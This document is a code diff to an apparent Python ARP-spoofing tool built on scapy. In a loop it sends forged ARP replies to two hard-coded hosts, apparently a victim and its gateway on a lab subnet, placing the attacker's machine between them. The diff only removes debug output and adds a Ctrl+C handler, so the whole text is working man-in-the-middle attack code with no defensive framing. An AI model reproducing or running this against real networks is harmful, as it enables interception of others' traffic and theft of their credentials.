@@ -33,19 +33,20 @@ def getMac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = getMac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    print(packet.show())
-    print(packet.summary())
     scapy.send(packet, verbose=False)
 
 
 # true is prevent change mac address of default gateway
-sendPacketsCount = 0
-while True:
-    spoof("10.211.55.4", "10.211.55.1")
-    spoof("10.211.55.1", "10.211.55.4")
-    sendPacketsCount = sendPacketsCount + 2
-    # \r bỏ in theo dòng và ngang
-    print("\r[+] Packet sent" + str(sendPacketsCount), end='')
-    # print nằm ngang
-    # sys.stdout.flush()
-    time.sleep(2)
+try:
+    sendPacketsCount = 0
+    while True:
+        spoof("10.211.55.4", "10.211.55.1")
+        spoof("10.211.55.1", "10.211.55.4")
+        sendPacketsCount = sendPacketsCount + 2
+        # \r bỏ in theo dòng và ngang
+        print("\r[+] Packet sent" + str(sendPacketsCount), end='')
+        # print nằm ngang
+        # sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C ... Quitting.")
